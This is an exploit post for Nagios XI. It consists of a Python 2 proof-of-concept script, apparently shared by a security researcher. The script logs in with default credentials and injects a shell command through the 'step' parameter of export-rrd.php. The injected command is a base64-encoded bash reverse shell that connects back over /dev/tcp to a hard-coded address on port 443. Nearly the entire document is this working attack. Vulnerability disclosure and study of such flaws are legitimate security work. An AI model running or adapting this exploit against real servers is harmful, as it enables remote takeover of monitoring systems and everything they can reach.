# Vendor: www.nagios.com
# Vulnerable software: https://www.nagios.com/downloads/nagios-xi/vmware/
# Repo: https://github.com/c610/free/


c@kali:~/src/eonila/nagiospox$ cat nagiospox.py
#!/usr/bin/env python
# nagiospox.py - small poc for nagiosxi rce
# 19.03.2020 by code610
#
# more : https://twitter.com/CodySixteen
#        https://code610.blogspot.com
#
import sys, re
import requests

target = sys.argv[1]
our_user = &#039;nagiosadmin&#039;
our_pass = &#039;nagiosadmin&#039;

def main():
  print &#039;nagios rce poc - vs - %s&#039; % ( target )

  sess = requests.session()

  baseUrl = target + &#039;:80/nagiosxi/&#039;
  checkBaseUrl = sess.get(baseUrl)
  checkBaseResp = checkBaseUrl.text

  #print checkBaseResp
  nsp_patt = "var nsp_str = \"(.*?)\""

  find_nsp = re.compile(nsp_patt)
  found_nsp = re.search(find_nsp, checkBaseResp)
  if found_nsp:
    nsp_val = found_nsp.group(1)
    print &#039;nsp value found: %s&#039; % ( nsp_val )

    # we will use nsp value in next login request
    loginurl = baseUrl + &#039;/login.php&#039; # ?redirect=/nagiosxi/index.php%3f&noauth=1&#039;
    data_login = {
      &#039;nsp&#039;: nsp_val,
      &#039;page&#039;: &#039;auth&#039;,
      &#039;debug&#039;:&#039;&#039;,
      &#039;pageopt&#039;:&#039;login&#039;,
      &#039;redirect&#039;:&#039;http://192.168.1.10/nagiosxi/index.php&#039;, # %2Fnagiosxi%2Findex.php%3F&#039;,
      &#039;username&#039;:our_user,
      &#039;password&#039;:our_pass,
      &#039;loginButton&#039;:&#039;&#039;
    }
    req = sess.post(loginurl, data=data_login, verify=False, allow_redirects=True)
    resp_code = req.status_code
    resp = req.text

    #print resp_code
    #print resp
    if resp_code == 200:
      print &#039;3rd request now!&#039;
      sh = "a|(echo+\"YmFzaCAtaSA%2bJiAvZGV2L3RjcC8xOTIuMTY4LjEuMTcwLzQ0MyAwPiYx\"|base64+-d+-|sh+-i);#"
      shellcode_req = baseUrl + &#039;/includes/components/xicore/export-rrd.php?host=localhost&service=Root%20Partition&start=1584108670&end=1584195130&step=&#039; + sh + &#039;&type=a&nsp=&#039; + nsp_val
      dosh = sess.get(shellcode_req, verify=False, allow_redirects=True)
      donesh = dosh.text

      print donesh


# run me:
if __name__ == &#039;__main__&#039;:
  main()
c@kali:~/src/eonila/nagiospox$

